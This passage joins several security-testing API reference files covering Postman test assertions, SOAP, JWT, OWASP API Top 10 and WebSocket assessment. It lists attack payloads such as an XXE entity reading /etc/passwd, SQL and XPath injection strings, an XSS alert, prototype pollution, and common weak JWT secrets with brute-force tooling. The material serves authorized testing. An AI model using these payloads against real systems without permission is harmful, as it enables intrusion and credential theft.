| `newman run <col> --reporters cli,json` | Output in CLI and JSON format |
| `newman run <col> --reporter-json-export out.json` | Export JSON results |
| `newman run <col> --timeout-request 10000` | 10s request timeout |
| `newman run <col> --delay-request 100` | 100ms delay between requests |

## Postman Test Script Functions

| Function | Description |
|----------|-------------|
| `pm.response.code` | HTTP response status code |
| `pm.response.text()` | Response body as string |
| `pm.response.json()` | Parsed JSON response |
| `pm.expect(val).to.equal(x)` | Chai assertion |
| `pm.expect(val).to.be.oneOf([])` | Value in expected set |
| `pm.expect(val).to.not.include(s)` | String not present |
| `pm.environment.set(k, v)` | Set environment variable |

## Collection Schema (v2.1.0)

```json
{
  "info": {"name": "...", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"},
  "item": [{"name": "...", "request": {...}, "event": [{"listen": "test", "script": {...}}]}]
}
```

## OWASP API Security Tests

| Test | Postman Assertion |
|------|-------------------|
| BOLA/IDOR | Expect 403/404 when accessing other user's resource |
| Auth bypass | Expect 401 without valid token |
| Mass assignment | Expect role field ignored in response |
| Injection | Expect no 500 or stack trace in response |
| Data exposure | Expect sensitive fields not in response |

## External References

- [Postman Learning Center](https://learning.postman.com/)
- [Newman Documentation](https://github.com/postmanlabs/newman)
- [Postman Test Scripts](https://learning.postman.com/docs/writing-scripts/test-scripts/)


---

## Source: `rest/performing-soap-web-service-security-testing/references/api-reference.md`

# API Reference: SOAP Web Service Security Testing

## WSDL Namespaces

| Prefix | URI | Purpose |
|--------|-----|---------|
| `wsdl` | `http://schemas.xmlsoap.org/wsdl/` | WSDL 1.1 definitions |
| `soap` | `http://schemas.xmlsoap.org/wsdl/soap/` | SOAP 1.1 binding |
| `soap12` | `http://schemas.xmlsoap.org/wsdl/soap12/` | SOAP 1.2 binding |
| `xsd` | `http://www.w3.org/2001/XMLSchema` | XML Schema types |
| `wsse` | `http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd` | WS-Security |

## SOAP Request Headers

| Header | Value | Description |
|--------|-------|-------------|
| `Content-Type` | `text/xml; charset=utf-8` | SOAP 1.1 content type |
| `Content-Type` | `application/soap+xml; charset=utf-8` | SOAP 1.2 content type |
| `SOAPAction` | `"http://example.com/Operation"` | Target operation URI |

## Common Test Payloads

| Test | Category | Severity |
|------|----------|----------|
| XXE file read (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) | XML Injection | Critical |
| Billion Laughs (`<!ENTITY` expansion) | DoS | High |
| SQL injection in parameters | Injection | Critical |
| SOAPAction header mismatch | Authorization Bypass | High |
| Missing WS-Security token | Authentication Bypass | Critical |
| XPath injection (`' or '1'='1`) | Injection | High |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `requests` | >=2.28 | Send raw SOAP HTTP requests |
| `lxml` | >=4.9 | Parse WSDL/XML with namespace support |
| `zeep` | >=4.2 | Full SOAP client with WSDL parsing |
| `suds-community` | >=1.1 | Alternative SOAP client |

## lxml Key Methods

| Method | Description |
|--------|-------------|
| `etree.fromstring(xml_bytes)` | Parse XML from bytes |
| `root.find(xpath, namespaces)` | Find single element |
| `root.findall(xpath, namespaces)` | Find all matching elements |
| `element.get(attr)` | Get attribute value |

## References

- OWASP SOAP Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- zeep Documentation: https://docs.python-zeep.org/en/master/
- WS-Security Specification: https://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0.pdf


---

## Source: `rest/testing-api-authentication-weaknesses/references/api-reference.md`

# API Reference: Testing API Authentication Weaknesses

## JWT Security Checks

| Check | Severity | Description |
|-------|----------|-------------|
| alg:none | Critical | Signature verification bypassed |
| Weak HMAC secret | Critical | Brute-forceable signing key |
| No exp claim | High | Token never expires |
| Long TTL (>24h) | Medium | Extended token validity |
| Sensitive data in payload | High | PII in JWT claims |
| Missing iss/aud claims | Medium | Token scope ambiguity |

## OWASP API2:2023 Test Points

| Test | Category |
|------|----------|
| Unauthenticated endpoint access | Missing auth middleware |
| JWT alg:none bypass | Broken token validation |
| JWT secret brute-force | Weak cryptographic key |
| Token reuse after logout | Missing revocation |
| Refresh token rotation | Session management |
| Account enumeration | Information disclosure |
| Password policy bypass | Weak credential controls |

## Common JWT HMAC Secrets

| Secret | Type |
|--------|------|
| `secret` | Default |
| `your-256-bit-secret` | JWT.io example |
| `jwt_secret` | Convention |
| `changeme` | Placeholder |

## JWT Attack Tools

| Tool | Purpose |
|------|---------|
| jwt_tool | JWT testing with 12+ attack modes |
| hashcat -m 16500 | GPU JWT secret brute-force |
| Burp JWT Editor | Interactive JWT manipulation |
| Nuclei | Auth bypass templates |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `requests` | >=2.28 | HTTP API calls |
| `base64` | stdlib | JWT decoding |
| `hmac` | stdlib | HMAC signature testing |
| `hashlib` | stdlib | Hash functions |

## References

- OWASP API Security Top 10: https://owasp.org/API-Security/
- JWT Best Practices RFC 8725: https://www.rfc-editor.org/rfc/rfc8725
- jwt_tool: https://github.com/ticarpi/jwt_tool


---

## Source: `rest/testing-api-security-with-owasp-top-10/references/api-reference.md`

# API Reference: Testing API Security with OWASP Top 10

## requests Library

### Installation
```bash
pip install requests
```

### Key Methods
| Method | Description |
|--------|-------------|
| `requests.get(url, headers=, params=, timeout=)` | Send GET request |
| `requests.post(url, json=, headers=, timeout=)` | Send POST request |
| `requests.put(url, json=, headers=)` | Send PUT request |
| `requests.patch(url, json=, headers=)` | Send PATCH request |
| `requests.delete(url, headers=)` | Send DELETE request |
| `requests.options(url, headers=)` | Send OPTIONS preflight |

### Response Object
| Attribute | Description |
|-----------|-------------|
| `resp.status_code` | HTTP status code (200, 401, 403, 429) |
| `resp.headers` | Response headers dict |
| `resp.json()` | Parse response body as JSON |
| `resp.text` | Response body as string |
| `resp.elapsed` | Response time as timedelta |

## OWASP API Security Top 10 (2023)
| ID | Risk | Test Approach |
|----|------|---------------|
| API1 | Broken Object Level Auth | Iterate object IDs with another user's token |
| API2 | Broken Authentication | Brute-force login, test JWT weaknesses |
| API3 | Broken Object Property Level Auth | Check excessive data + mass assignment |
| API4 | Unrestricted Resource Consumption | Test pagination limits, rate limiting |
| API5 | Broken Function Level Auth | Access admin endpoints as regular user |
| API6 | Unrestricted Access to Sensitive Flows | Abuse OTP, reset, registration flows |
| API7 | Server-Side Request Forgery | Inject internal URLs in URL parameters |
| API8 | Security Misconfiguration | Check headers, CORS, error verbosity |
| API9 | Improper Inventory Management | Find deprecated API versions |
| API10 | Unsafe Consumption of APIs | Test trust boundaries with third-party data |

## Security Header Checks
| Header | Expected Value |
|--------|---------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` |
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` |
| `Content-Security-Policy` | Restrictive policy |

## References
- OWASP API Security Top 10: https://owasp.org/API-Security/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- requests docs: https://docs.python-requests.org/


---

## Source: `websocket/exploiting-websocket-vulnerabilities/references/api-reference.md`

# API Reference: WebSocket Vulnerability Assessment Agent

## Dependencies

| Library | Version | Purpose |
|---------|---------|---------|
| websockets | >=11.0 | Async WebSocket client for connection and message testing |
| requests | >=2.28 | HTTP-level WebSocket handshake inspection |

## CLI Usage

```bash
python scripts/agent.py \
  --url wss://target.example.com/ws \
  --cookie "session=abc123" \
  --output ws_report.json
```

## Functions

### `discover_ws_endpoints(base_url) -> list`
Probes 9 common WebSocket paths with upgrade headers to find endpoints.

### `test_origin_validation(ws_url, cookie) -> dict`
Sends WebSocket upgrade requests with evil Origin headers. Acceptance indicates CSWSH risk.

### `test_no_auth_connect(ws_url) -> dict` (async)
Attempts WebSocket connection without any authentication tokens.

### `test_message_injection(ws_url, cookie) -> list` (async)
Sends 6 injection payloads (SQLi, XSS, SSTI, path traversal, command injection) and checks responses.

### `test_idor_channels(ws_url, cookie, channel_ids) -> list` (async)
Subscribes to channels 1-5 to test for IDOR in channel access.

### `test_rate_limiting(ws_url, cookie, count) -> dict` (async)
Sends 100 rapid messages and checks if the connection is throttled or closed.

### `run_assessment(ws_url, cookie) -> dict`
Orchestrates all tests and compiles findings.

## websockets Library Usage

| Method | Purpose |
|--------|---------|
| `websockets.connect(url, extra_headers)` | Async context manager for WS connection |
| `ws.send(data)` | Send a text frame |
| `ws.recv()` | Receive next frame |
| `asyncio.wait_for(ws.recv(), timeout)` | Receive with timeout |

## Output Schema

```json
{
  "target": "wss://target.example.com/ws",
  "origin_validation": {"cswsh_vulnerable": true},
  "unauthenticated_access": {"connected": false},
  "injection_tests": [{"payload": {"query": "' OR 1=1--"}, "suspicious": true}],
  "rate_limiting": {"rate_limited": false},
  "findings": ["HIGH: Cross-Site WebSocket Hijacking possible"]
}
```


---

## Source: `websocket/testing-websocket-api-security/references/api-reference.md`

# API Reference: Testing WebSocket API Security

## WebSocket Attack Surface

| Attack | Severity | Description |
|--------|----------|-------------|
| CSWSH | Critical | Cross-Site WebSocket Hijacking via Origin |
| No authentication | High | Connection without credentials accepted |
| Channel auth bypass | High | Subscribe to privileged channels |
| Injection via messages | Medium | SQL/XSS/command injection in payloads |
| Message flooding | Medium | DoS through rapid message sending |
| Prototype pollution | Medium | `__proto__` payload in JSON messages |

## WebSocket Handshake Headers

| Header | Direction | Purpose |
|--------|-----------|---------|
| Upgrade: websocket | Request | Protocol upgrade request |
| Connection: Upgrade | Request | Connection type change |
| Sec-WebSocket-Key | Request | Client nonce for handshake |
| Sec-WebSocket-Version | Request | Protocol version (13) |
| Sec-WebSocket-Accept | Response | Server handshake confirmation |
| Origin | Request | CSWSH validation target |

## Injection Payload Categories

| Category | Example |
|----------|---------|
| Admin action | `{"action":"admin","data":"test"}` |
| Path traversal | `{"channel":"../admin"}` |
| XSS | `<script>alert(1)</script>` |
| SQLi | `' OR 1=1 --` |
| Prototype pollution | `{"__proto__":{"isAdmin":true}}` |
| Oversized message | 100KB+ payload |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `websockets` | >=10.0 | Async WebSocket client |
| `asyncio` | stdlib | Async event loop |
| `requests` | >=2.28 | HTTP upgrade header check |
| `json` | stdlib | Message/report serialization |

## References

- OWASP WebSocket Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
- PortSwigger WebSocket: https://portswigger.net/web-security/websockets
- RFC 6455: https://www.rfc-editor.org/rfc/rfc6455
